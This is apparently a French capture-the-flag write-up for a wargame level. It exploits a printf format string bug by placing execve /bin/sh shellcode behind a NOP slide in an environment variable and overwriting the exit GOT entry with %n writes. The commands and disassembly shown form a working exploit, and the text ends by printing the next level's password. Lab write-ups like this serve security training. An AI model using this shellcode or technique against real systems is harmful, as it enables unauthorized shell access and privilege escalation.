Pour ce niveau, comme dans le niveau 5 de rainfall il faut utiliser un format string exploit via le printf :

 > 8048507:       e8 34 fe ff ff          call   8048340 <printf@plt>

 Le programme fait un fgets de taille 0x64 :

8048466:       c7 44 24 04 64 00 00    movl   $0x64,0x4(%esp)
 804846d:       00
 804846e:       8d 44 24 28             lea    0x28(%esp),%eax
 8048472:       89 04 24                mov    %eax,(%esp)
 8048475:       e8 d6 fe ff ff          call   8048350 <fgets@plt>

 Ensuite il va itérer sur chaque chat de la string et check si le char est une majusqcule, si oui, le char est changé en minuscule.

 On va tout d'abord ajouter notre scripte précédé d'un nop slide à l'environement :

**************************************************************************************************
export SCRIPT=$(python -c "print '\x90'*80 + '\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1'")
***************************************************************************************************

Grâce au format string exploit on va aller récupérer l'adresse de le fonction exit dans la GOT et la modifier par une des adresse du nop slide dans l'env.

adresse à modifier : 

(gdb) disass 0x8048370

*************************************************
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0  <-------- on va modifier l'adresse à cette adresse.
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
***************************************************

Notre variable SCRIPT ce trouve ici : 

*******************************************************************************
0xffffd8e0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8f0:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd900:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd910:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd920:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd930:     0x6880cd68      0x68fceb68      0x31580b6a      0x2f6852d2
*******************************************************************************

on va donc grâce au %n de printf réécrire sur l'adresse qu'on avait pour exit afin d'y mettre une des adresse du nop slide :

(python -c "print '\xe0\x97\x04\x08' + '\xe1\x97\x04\x08' + '\xe2\x97\x04\x08' + '\xe3\x97\x04\x08' + '%x '*8 + '%55477x' + '%n' + '%75519x' + '%hn'"; cat) | ./level05

> cat /home/users/level06/.pass
    h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq